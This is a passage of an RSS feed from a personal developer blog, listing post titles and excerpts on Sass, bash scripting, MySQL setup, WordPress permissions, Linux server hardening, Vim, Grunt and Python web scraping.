      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/sass-convert-pixels-px-ems/</guid>
      <description>Function Add this to your Sass (functions) file. It is recommended that you keep a separate functions.scss file and @import &#39;functions&#39;; at the top of your main/global css file. This way it keeps things organized. OR you could just add this function to the top of your main scss file.
{% highlight scss %} @function pem($pixels) { @return #{$pixels/16.0}em } {% endhighlight %}  Usage Using scss syntax:
{% highlight scss %} @media (min-width: pem(768)) { .</description>
    </item>
    
    <item>
      <title>Scope</title>
      <link>/post/_programming/scope/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/scope/</guid>
      <description> Scope  where to look for things
 Notes  JavaScript is a compiled language. It is compiled everytime it is run (i.e. compiled at runtime) JavaScript has only function scope atm.  Links  Frontend Masters: Advanced JavaScript - Scope  </description>
    </item>
    
    <item>
      <title>Secure MySQL installation non-interactively with a bash script</title>
      <link>/post/_databases/secure_mysql_script_non-interactive/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/secure_mysql_script_non-interactive/</guid>
      <description>There are two ways you can write the script. One is running the script with a here-document.
 A here document (aka heredoc) is a special-purpose code block. It uses a form of I/O redirection to feed a command list to an interactive program or a command
 Basically, you provide only the answers to the question the script is going to ask you, and then redirect them as input to the interactive program.</description>
    </item>
    
    <item>
      <title>Secure a Linux Ubuntu Server</title>
      <link>/post/_sysadmin/secure-linux-ubuntu-server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/secure-linux-ubuntu-server/</guid>
      <description>STATUS: Draft
#!/bin/bash # SECURE / HARDEN A LINUX (UBUNTU) SERVER apt update &amp;amp;&amp;amp; apt upgrade -y # Enable automatically installing security updates # Rootkit Hunter - Scan for Rootkits, backdoors and exploits rkhunter() { wget https://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar xf rkhunter-1.4.4.tar.gz sudo rkhunter-1.4.4/installer.sh --layout default --install sudo rkhunter --versioncheck sudo rkhunter --update # update database sudo rkhunter --propupd # set baseline file properties (so that rkhunter can alert us if any of the essential configuration files it tracks are altered) rkhunter --check # scan the entire file system }  RKHunter downloads a list of known exploits and then checks your system against the database.</description>
    </item>
    
    <item>
      <title>Securing Wordpress</title>
      <link>/post/_sysadmin/securing-wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/securing-wordpress/</guid>
      <description>File Permissions The default permission scheme should be:
 Folders 755 Files 644  Avoid having any file or directory set to 777. 777 means global access. Usually only cache files have this permission.
Via command line you can run the following commands to change permissions recursively:
# For Directories: find /path/to/your/wordpress/install/ -type d -exec chmod 755 {} \; # For Files: find /path/to/your/wordpress/install/ -type f -exec chmod 644 {} \;  Secured File Permissions for specific files You should set these permissions</description>
    </item>
    
    <item>
      <title>Select files with multiple different file extensions</title>
      <link>/post/_commands/select-multiple-file-extensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/select-multiple-file-extensions/</guid>
      <description>tl;dr # *.{a,b,c,d} ls -alh *.{md,json,html,xml} # list all files ending in given extensions find . -type f *.{html,xml,php} # find all files ending in given extensions find . -type f *.{html,xml,php} -exec rm -rf {} \; # find and delete all files ending in given extensions  Find/List files find . -type f *.{html,xml,php}  will find all (*) files (-type f) in the current directory (.) ending in .</description>
    </item>
    
    <item>
      <title>Self-invoking Anonymous Function - IIFE</title>
      <link>/post/_javascript/ajax-self-invoking-anonymous-function-ajax/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/ajax-self-invoking-anonymous-function-ajax/</guid>
      <description>A slef-invoking anonymous function is to make sure we stay out of the gloabl scope so that our script can play nicely with others. This is useful/needed when all you javascript code is in one main file.
We can do this by wrapping the code we write or execute within a selfinvoking anonymous function. We create a self incoking anonymous function like this:
(function() { })();  Now, whatever we put inside of here will only be unique to this anonymous function.</description>
    </item>
    
    <item>
      <title>Set `npm init` defaults globally</title>
      <link>/post/_javascript/2017-02-20-howto-set-npm-defaults-globally/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2017-02-20-howto-set-npm-defaults-globally/</guid>
      <description>You can either edit the global configuration file for npm:
npm config edit --global  (it&amp;rsquo;ll open the file in Vim)
Or, you can set the defaults one by one:
# npm config set &amp;lt;key&amp;gt; &amp;lt;value&amp;gt; [-g|--global] npm config set -g init-author-name &#39;Aamnah&#39; npm config set -g init-author-email &#39;hello@aamnah.com&#39; npm config set -g init-author-url &#39;http://aamnah.com&#39; npm config set -g init-license &#39;CC-BY-SA-4.0&#39; npm config set -g init-version &#39;0.1.0&#39;  You can also use the npm init command with the y flag to initiate a project with the default values without prompting you for details.</description>
    </item>
    
    <item>
      <title>Set up Apache, PHP, MySQL, PHPMyAdmin on macOS Sierra</title>
      <link>/post/_workflow/mac-local-dev-env/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/mac-local-dev-env/</guid>
      <description>Why not just MAMP? Becaus i was running low on space. MAMP takes about 1.8GB+ on my current MacBook Air with 128GB of base storage.. I am assuming this local setup takes much less space. XAMPP also takes about 2GB+, which is too much when i just want a simple local server with PHP.
You will need to run some commands as the root (super) user. You can switch to root with sudo -s or sudo su -  Apache Apache is already installed on macOS Sierra</description>
    </item>
    
    <item>
      <title>Set up a new macOS machine with Homebrew-Cask</title>
      <link>/post/_workflow/setup-new-macos-machine-homebrew-cask/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/setup-new-macos-machine-homebrew-cask/</guid>
      <description>Cask let&amp;rsquo;s you install commonly used software, stuff that you would drag and drop to install, via the Terminal or a script. For example,
brew cask install google-chrome  will install Google Chrome. While Homebrew let&amp;rsquo;s you install command line utilities, Cask let&amp;rsquo;s you install macOS desktop (GUI) software.
If you&amp;rsquo;re a developer, you can use cask to install your preferred browsers, code editors, tools and such with a simple script.</description>
    </item>
    
    <item>
      <title>Setup SSH Keys for Bitbucket on Mac/Linux</title>
      <link>/post/_linux/2015-01-18-ssh-bitbucket-mac-linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2015-01-18-ssh-bitbucket-mac-linux/</guid>
      <description>Generate an SSH Key Pair cd ~/.ssh &amp;amp;&amp;amp; ssh-keygen -t rsa  Copy the Public key cat ~/.ssh/keyname.pub  Copy the output given as a result of the command above. It is the content of your keyname.pub file.
If you are on a Mac, you can directly copy the contents of keyname.pub by running
cat ~/.ssh/keyname.pub | pbcopy  Start the SSH Agent and Load your keys See if ssh-agent is running</description>
    </item>
    
    <item>
      <title>Showing Help and Usage</title>
      <link>/post/bash-scripting/showing-help-usage/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/showing-help-usage/</guid>
      <description>A basic way is saving usage as a function
showUsage() { echo -e &amp;quot;Usage: please provide an argument&amp;quot; }  and later in your script, you can run a conditional statement that checks for something, say no arguments are provided, you can show the usage and exit
if [ condition ] then showUsage exit 1 else # run the code fi  </description>
    </item>
    
    <item>
      <title>Streams (stderr, stdin, stdout)</title>
      <link>/post/_commands/streams-stderr-stdin-stdout/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/streams-stderr-stdin-stdout/</guid>
      <description>stdin Standard In. Whatever is entered into the bash terminal
stdout Standard Out. Whatever output was given back by the terminal.
stderr Standard Error. Whatever error was given back by the terminal
Redirect stderr to /dev/null You can redirect the stderr to /dev/null to get rid of it. You don&amp;rsquo;t care if there are errors, you don&amp;rsquo;t want to see those errors, you don&amp;rsquo;t want to log those errors, you just want them gone.</description>
    </item>
    
    <item>
      <title>Strict mode in JavaScript with `use strict`</title>
      <link>/post/_javascript/2016-12-12-intro-use-strict-javascript/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2016-12-12-intro-use-strict-javascript/</guid>
      <description>tl;dr  Runs the JS interpreter in a strict mode, meaning it fails loudly for bad practices in JS Strict mode also eliminates silent errors. When something pretty major is going wrong, you won&amp;rsquo;t have to hunt for it. If you&amp;rsquo;re writing good code, &#39;use strict&#39; shouldn&amp;rsquo;t cause you any problems Part of ES5/ES2015, official JS standard Goes on top your code, must be the first line in your file.</description>
    </item>
    
    <item>
      <title>Taking care of prompt imputs from a script with Debconf</title>
      <link>/post/_sysadmin/debconf-set-selections-prompt-installs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/debconf-set-selections-prompt-installs/</guid>
      <description> sudo apt install debconf-utils -y  see what possible selections a package may have
sudo debconf-get-selections | grep mysql  mysql-server-5.7	mysql-server/root_password	password mysql-server-5.7	mysql-server/root_password_again	password mysql-server-5.7	mysql-server/no_upgrade_when_using_ndb	error mysql-server-5.7	mysql-server/password_mismatch	error mysql-server-5.7	mysql-server-5.7/start_on_boot	boolean	true mysql-server-5.7	mysql-server-5.7/postrm_remove_databases	boolean	false mysql-server-5.7	mysql-server-5.7/nis_warning	note mysql-server-5.7	mysql-server-5.7/really_downgrade	boolean	false  set those selections
MYSQL_PASS=&#39;your_password&#39; sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password password ${MYSQL_PASS}&amp;quot; sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password_again password ${MYSQL_PASS}&amp;quot;  Links  Installing MySQL (with Debconf) Pre-loading debconf values for easy installation  </description>
    </item>
    
    <item>
      <title>Taking user input</title>
      <link>/post/bash-scripting/taking-user-input/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/taking-user-input/</guid>
      <description>You can read user input as a variable.
For example:
read name  will save what the user entered and save it as a variable called name.
You can ask a question first, like so:
echo &amp;quot;What&#39;s your name?&amp;quot; read input echo &amp;quot;Your name is: $input&amp;quot;  By default, it&amp;rsquo;ll ask for input on a new line. You can supress the new line with -n
You can use read instead of $1.</description>
    </item>
    
    <item>
      <title>The Simplest AJAX Script</title>
      <link>/post/api/simplest-ajax-script/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/simplest-ajax-script/</guid>
      <description>index.html
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Learning AJAX&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;The Simplest AJAX script&amp;lt;/h1&amp;gt; &amp;lt;a href=&amp;quot;ajax.txt&amp;quot;&amp;gt;Load Ajax text file&amp;lt;/a&amp;gt; &amp;lt;script src=&amp;quot;main.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  main.js
(function(){ var link = getElementByTagName(&#39;a&#39;)[0]; link.onclick = function() { return false }; })();  In our page, we will add a link, which when clicked will load the text from a file (which we called &amp;lsquo;ajax.txt&amp;rsquo; here) the ajax way i.e. without refreshing the whole page.</description>
    </item>
    
    <item>
      <title>Things that i love about my Mac</title>
      <link>/post/_misc/2015-03-13-things_that_i_love_about_my_mac/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_misc/2015-03-13-things_that_i_love_about_my_mac/</guid>
      <description>I converted to a Mac __ years ago. And i can&amp;rsquo;t see myself going back to Windows or a non-Apple laptop.
The software i use is already available for Mac. I&amp;rsquo;m a web developer, i have everything i need already on my Mac. The only software i ever. For everything else, there is either a Mac version available or an alternative available. In some cases i found that the Mac version of the same software looks better than it&amp;rsquo;s Windows counterpart.</description>
    </item>
    
    <item>
      <title>Tips for Querying a MySQL Database</title>
      <link>/post/_databases/2015-02-20-querying-selecting-showing-data-from-mysql-database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-20-querying-selecting-showing-data-from-mysql-database/</guid>
      <description>Sort result ORDER based on frequency Here is a nifty way of influencing the ORDER of rows returned by a query that helps in displaying a list with frequently accessed items at the top.
An example is a name/address form where the country is a selectable list. If most of your users are from the UK and US you may want to do something like:
{% highlight mysql %} SELECT * FROM countries ORDER by iso_code IN (&#39;UK&#39;, &#39;US&#39;) desc {% endhighlight %}  Which returns something like:</description>
    </item>
    
    <item>
      <title>Update WordPress posts for SSL https</title>
      <link>/post/_databases/update-wordpress-posts-https/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/update-wordpress-posts-https/</guid>
      <description>tl;dr # UPDATE `wp_posts` SET `post_content` = REPLACE(post_content, &#39;&#39;, &#39;&#39;) # Update self-hosted embeds (images, iframes, scripts, etc.) UPDATE `wp_posts` SET `post_content` = REPLACE(post_content, &#39;http://yoursite.com&#39;, &#39;https://yoursite.com&#39;); UPDATE `wp_posts` SET `post_content` = REPLACE(post_content, &#39;http://www.yoursite.com&#39;, &#39;https://www.yoursite.com&#39;); # Update internal pingbacks UPDATE `wp_comments` SET `comment_author_url` = REPLACE(comment_author_url, &#39;http://yoursite.com&#39;, &#39;https://yoursite.com&#39;); UPDATE `wp_comments` SET `comment_author_url` = REPLACE(comment_author_url, &#39;http://www.yoursite.com&#39;, &#39;https://www.yoursite.com&#39;); # Update YouTube embeds UPDATE `wp_posts` SET `post_content` = REPLACE(post_content, &#39;http://www.youtube.com&#39;, &#39;https://www.youtube.com&#39;); UPDATE `wp_posts` SET `post_content` = REPLACE(post_content, &#39;http://img.</description>
    </item>
    
    <item>
      <title>Upgrade OpenCart Extensions from 2.1x to 2.3x/3x</title>
      <link>/post/_opencart/upgrade-opencart-extensions-2x-3x/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/upgrade-opencart-extensions-2x-3x/</guid>
      <description>Language  The default language folder is now called en-gb instead of english. Update your scripts to reflect the change It looks like it is no longer saving language variables in controller files. For example, this whole chunk is gone from admin/controller/extension/shipping/pickup.php  $data[&#39;heading_title&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;heading_title&#39;); $data[&#39;text_edit&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;text_edit&#39;); $data[&#39;text_enabled&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;text_enabled&#39;); $data[&#39;text_disabled&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;text_disabled&#39;); $data[&#39;text_all_zones&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;text_all_zones&#39;); $data[&#39;text_none&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;text_none&#39;); $data[&#39;entry_geo_zone&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;entry_geo_zone&#39;); $data[&#39;entry_status&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;entry_status&#39;); $data[&#39;entry_sort_order&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;entry_sort_order&#39;); $data[&#39;button_save&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;button_save&#39;); $data[&#39;button_cancel&#39;] = $this-&amp;gt;language-&amp;gt;get(&#39;button_cancel&#39;);  Folder Structure  The default folder structure has changed.</description>
    </item>
    
    <item>
      <title>Upgrade to Bash 4 on macOS</title>
      <link>/post/bash-scripting/bash-upgrade-macos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/bash-upgrade-macos/</guid>
      <description># install Bash via Homebrew brew update &amp;amp;&amp;amp; brew install bash # Add the new shell to the list of allowed (white-listed) shells # sudo bash -c &#39;echo /usr/local/bin/bash &amp;gt;&amp;gt; /etc/shells&#39; echo &amp;quot;$(brew --prefix)/bin/bash&amp;quot; &amp;gt;&amp;gt; /etc/shells # Change to the new shell chsh -s $(brew --prefix)/bin/bash   sudo -i let&amp;rsquo;s you switch to root user brew --prefix gives you the location of Homebrew install directory (/usr/local by default) cat /etc/shells gives you the list of allowed shells  </description>
    </item>
    
    <item>
      <title>Upgrading OpenCart Extensions</title>
      <link>/post/_opencart/upgrade-opencart-extensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/upgrade-opencart-extensions/</guid>
      <description>Coding standards  Removed the PHP ending tag ?&amp;gt; from php files  Load the Language File In 1.5.x, you would use the following snippet to load the corresponding module language file.
$this-&amp;gt;language-&amp;gt;load(&#39;account/account&#39;);  On the other hand, you need to use a slightly different version in the case of OpenCart 2.x.x, as shown in the following snippet.
$this-&amp;gt;load-&amp;gt;language(&#39;account/account&#39;);  Controller 1. Assigning template variables most of the time you&amp;rsquo;ll end up assigning your variables so that you can access them in the view template files</description>
    </item>
    
    <item>
      <title>User IDs</title>
      <link>/post/_linux/user-id-details/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/user-id-details/</guid>
      <description>Process data and Ownership data in Linux use UIDs exclusively.
This can create diffculties if a user is deleted while he still owns files in the filesystem. His UID can perhaps be assigned to a different user, and that user will inherit the previous UID owners files.
There is no technical problem with assigning the same numerical UID to different usernames but these users will have equal access to the files owned by that numeric UID.</description>
    </item>
    
    <item>
      <title>Using PHP with MySQL</title>
      <link>/post/_databases/2015-02-24-using_php_with_mysql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-24-using_php_with_mysql/</guid>
      <description>Connecting to Database using PDO The format is like this
{% highlight php %} &amp;lt;?php $db = new PDO(&amp;quot;db_engine:db_details&amp;quot;, &amp;quot;db_username&amp;quot;, &amp;quot;db_user_passowrd&amp;quot;); ?&amp;gt; {% endhighlight %}  Here is an example with values
{% highlight php %} &amp;lt;?php $db = new PDO(&amp;quot;mysql:host=189.876.567.123;dbname=shop;port=5678&amp;quot;, &amp;quot;developer&amp;quot;, &amp;quot;8972g9gh^^%&amp;amp;&amp;quot;); ?&amp;gt; {% endhighlight %}  In database details mysql: tells what database engine to use.
Handling Exceptions Exceptions happen when something goes wrong. Any code connecting to an external system needs to handle exceptions.</description>
    </item>
    
    <item>
      <title>Using a third-party library with PHP</title>
      <link>/post/_php/2015-02-24-using_a_third-party_library_with_php/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_php/2015-02-24-using_a_third-party_library_with_php/</guid>
      <description>Downloading and Including files For this example, we&amp;rsquo;ll use PHPMailer. Grab the latest stable release.
The main file we need is class.phpmailer.php
First we&amp;rsquo;ll include the file using require_once().
Require_once is similar to include(). The difference between the two is what happens when we encounter an error. If we use the include command and the file doesn&amp;rsquo;t exist, PHP will throw a warning but it&amp;rsquo;ll execute the rest of the code.</description>
    </item>
    
    <item>
      <title>Using urllib2 in Python to get content from web pages</title>
      <link>/post/_python/2014-08-26-using-urllib2-in-python-to-get-content-from-web-pages/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-26-using-urllib2-in-python-to-get-content-from-web-pages/</guid>
      <description>First of all, you&amp;rsquo;d need to import urllib2. Add import urllib2 at the beginning of your python file.
Opening a URL {% highlight python%} import urllib2 myurl = urllib2.urlopen(&#39;http://aamnah.com&#39;) {% endhighlight %}  The contents of the page http://aamnah.com are now stored in the variable &amp;lsquo;myurl&amp;rsquo;.
At this point if you print myurl it&amp;rsquo;ll output &amp;lt;addinfourl at 4420156736 whose fp = &amp;lt;socket._fileobject object at 0x10759c7d0&amp;gt;&amp;gt; which basically tells you that the content exists instead of outputting the content.</description>
    </item>
    
    <item>
      <title>Variables and Arguments</title>
      <link>/post/bash-scripting/variables-and-arguments/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/variables-and-arguments/</guid>
      <description>Variables name=&amp;quot;Aamnah&amp;quot; $name=&amp;quot;Aamnah&amp;quot;  There is NO whitespace before or after =. $name=&amp;quot;Aamnah&amp;quot; will work but the preferred syntax is not including $ sign when you are defining a variable. You should use the $ sign when you are calling the variable and NOT when you&amp;rsquo;re defining it.
Referencing variables: echo $name echo ${name}  ${name} is preferred syntax.
Arguments Arguments are keywords that are passed in the command line when executing the bash script/command.</description>
    </item>
    
    <item>
      <title>Vi and Vim</title>
      <link>/post/_linux/vi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/vi/</guid>
      <description>Vi Importance of Vi
Usually the text editor we can throw on a boot disk. It&amp;rsquo;s very light weight, very small in terms of memory size.
You can actually make command line arguments from within Vi, like cerating a directory.
Vi vs Vim Vim is the improved version of Vi. In most distributions Vi has been replaced by Vim. Vim is backwards-compatible with Vi.
Modes:
 i insert mode ex ex mode : command mode  Changing modes = esc</description>
    </item>
    
    <item>
      <title>Vim Basics</title>
      <link>/post/_linux/2014-05-21-vim-basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-05-21-vim-basics/</guid>
      <description>Save file and exit in Vim To go to insert mode: a
To save: [Esc] and zz
To quit: [Esc] and :wq
Common Vi / Vim File Savings Related Commands (ex mode) You need to press [Esc] key followed by the colon (:) before typing the following commands:
q Quit
q! Quit without saving changes i.e. discard changes
r fileName Read data from file called fileName
wq Write and quit (save and exit)</description>
    </item>
    
    <item>
      <title>Web scraping in Python to look up stock prices</title>
      <link>/post/_python/2014-08-26-web-scraping-in-python-to-look-up-stock-prices/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-26-web-scraping-in-python-to-look-up-stock-prices/</guid>
      <description>Objective We are going to scrape the FT.com website for current stock prices for selected stocks. You&amp;rsquo;ll learn:
 scraping web page fetching price/quote (with regex) presenting results error handling coloring the output  Step 1: Taking input, Opening URL and Grabbing data {% highlight python %} # import &#39;urllib2&#39; to open the url and &#39;sys&#39; so we could take input from console import urllib2, sys # take input from the console and save it as &#39;symbol&#39; symbol = sys.</description>
    </item>
    
    <item>
      <title>What to .gitignore</title>
      <link>/post/_git-github/gitignore-files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_git-github/gitignore-files/</guid>
      <description> Cache folders (.DS_Store, sass_cache) Modules/Packages folders generated by dependency managers (node_modules, vendor) Any folders that can be easily regenrated on the other end by a config file Configuration files. Anything that contains private usernames and passwords  Following are common files added to my .gitignore
# Mac OS X .DS_Store */.DS_Store # Opencart image/cache system/cache # OC 1x system/storage/cache # OC 2x vqmod/vqcache # Webhost cgi-bin # Dependency and Package folders node_modules vendor # Sass sass_cache  </description>
    </item>
    
    <item>
      <title>Window object</title>
      <link>/post/_webdev/window-object/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/window-object/</guid>
      <description>Window is the browser window alert(&#39;hello&#39;) is the same as window.alert(&#39;hello&#39;) When we refer to variable or function, it looks in the local scope first. If it is not found there, it moves up the chain until it reaches the Window object, at which point it is global All global variables are part of the Window object. They can be referenced as window.foo You can overwrite global (Window object) functions by redeclaring them with the same name Window object is in the global namespace  let greeting = &#39;Bonjour!</description>
    </item>
    
    <item>
      <title>Working with APIs using AJAX and JSON</title>
      <link>/post/_javascript/ajax-working-with-apis-using-ajax-and-json/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/ajax-working-with-apis-using-ajax-and-json/</guid>
      <description> Code: $(document).ready(function() { }); // end ready  Explanation: $(document).ready(function() { });  tells the function to wait until the HTML for the page has completely loaded before running the JavaScript code placed inside it.
making an ajax request when a button is pushed $.getJSON(flickerAPI, flickrOptions, displayPhotos); .getJSON(url, data, callback);  </description>
    </item>
    
    <item>
      <title>Working with Grunt</title>
      <link>/post/_workflow/2014-09-14-grunt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/2014-09-14-grunt/</guid>
      <description>Installation Node.js and NPM Install Node by downloading the package from their website and running the install. You can also install it on a Mac via homebrew (Mac) by running the command
brew install node  NPM (Node Package Manager) comes with Node by default.
Grunt CLI Install Grunt CLI:
npm install -g grunt-cli  (the -g means to install it globally on your OS so that you can use the grunt command where ever you are on your system).</description>
    </item>
    
    <item>
      <title>Write a Bash Function to Create a gruntfile.js for your project</title>
      <link>/post/bash-scripting/2015-02-15-bash-function-create-gruntfile.js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/2015-02-15-bash-function-create-gruntfile.js/</guid>
      <description>Here is how it works Everyt time i type gruntfile in the Terminal, it creates a gruntfile.js for me in the folder i am in. The resulting gruntfile.js has the following template code:
module.exports = function(grunt) { grunt.initConfig({ pkg: grunt.file.readJSON(&#39;package.json&#39;), // CONFIG }); // PLUGINS grunt.loadNpmTasks(&#39;&#39;); // TASKS grunt.registerTask(&#39;default&#39;, [&#39;&#39;, &#39;&#39;]); };  I can now add my Grunt config to it.
What i have done is create a function gruntfile for me and saved in my .</description>
    </item>
    
    <item>
      <title>Writing a Grunt Task for Website Speed Optimization</title>
      <link>/post/_workflow/2015-01-19-grunt-task-page-website-speed-optimization-minify-concat/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/2015-01-19-grunt-task-page-website-speed-optimization-minify-concat/</guid>
      <description>This Grunt task will be able to take care of the following:
 Minifying CSS Minifying JS Minifying HTML Concatentaing multiple JS files Concatenating multiple CSS files Optimizing Images  NOTE: ImageOptim is wayyyy better than imagemin. Imageoptim &amp;lsquo;Saved 3MB out of 24.9MB. 15.4% per file on average (up to 84.7%)&amp;rsquo; where imagemin did &amp;lsquo;Minified 368 images (saved 0 B)&amp;rsquo; for the same files. The only issue is, Image optim works on your mac and opens imageoptim installed on it to compress images.</description>
    </item>
    
    <item>
      <title>Yum Transaction Check Errors &amp;amp; Dependencies/Package Conflicts</title>
      <link>/post/_linux/2015-01-19-yum-transaction-check-error-package-conflict/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2015-01-19-yum-transaction-check-error-package-conflict/</guid>
      <description>Transaction Check Error: file /etc/pki/tls/certs/ca-bundle.crt from install of openssl-0.9.8e-32.el5_11.x86_64 conflicts with file from package openssl-0.9.8e-26.el5_9.1.i686 file /usr/share/man/man1/ca.1ssl.gz from install of openssl-0.9.8e-32.el5_11.x86_64 conflicts with file from package openssl-0.9.8e-26.el5_9.1.i686 file /usr/share/man/man1/req.1ssl.gz from install of openssl-0.9.8e-32.el5_11.x86_64 conflicts with file from package openssl-0.9.8e-26.el5_9.1.i686 file /usr/share/man/man1/x509.1ssl.gz from install of openssl-0.9.8e-32.el5_11.x86_64 conflicts with file from package openssl-0.9.8e-26.el5_9.1.i686  This can happen if:
 package architecture is different (32-bit vs 64-bit) package source/repo is different you have a newer package installed while the repo you are trying to &amp;lsquo;update&amp;rsquo; from has an older version package already installed is 32-bit but 32-bit packages are excluded in /etc/yum.</description>
    </item>
    
    <item>
      <title>[Bash] Bash PATH Environment Variable</title>
      <link>/post/_linux/bash-path-environment-variable/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/bash-path-environment-variable/</guid>
      <description>~ $ echo $PATH /Library/Frameworks/Python.framework/Versions/3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Users/aamnah/Dropbox/todo ~ $ cat /etc/paths /usr/local/bin /usr/bin /bin /usr/sbin /sbin PATH=/usr/local/bin:$PATH # prepend a path to your current $PATH  Ubuntu The following command adds (appends) a path to your current path:
export PATH=$PATH:/my/custom/path  If you want your setup to execute this command every time, there are a number of places where you can put it. When you login, the following scripts will be executed in this order:</description>
    </item>
    
    <item>
      <title>[Bash] Customizing the Bash Prompt</title>
      <link>/post/_linux/customizing-the-bash-prompt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/customizing-the-bash-prompt/</guid>
      <description>Customizing your terminal PS1=&amp;quot;[\u @ \h] \w &amp;gt; &amp;quot;  in the bash profile will output this:
[aamnah @ Serenity] ~/Sandbox/aamnah.com &amp;gt;   \u is your username which in my case is aamnah; \h is the hostname (the name of your machine) which is Serenity \w is the working directory which in my case is ~/Sandbox/aamnah.com  You can add or remove variables to customize what it shows in the terminal.</description>
    </item>
    
    <item>
      <title>[Bash] Reload Bash Shell without quitting</title>
      <link>/post/_linux/reload-bash-shell-without-quitting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/reload-bash-shell-without-quitting/</guid>
      <description>You just have to enter the command:
source ~/.bashrc  or you can use the shorter version of the command:
. ~/.bashrc  or you could use;
exec bash  does the same thing. (and easier to remember, at least for me)
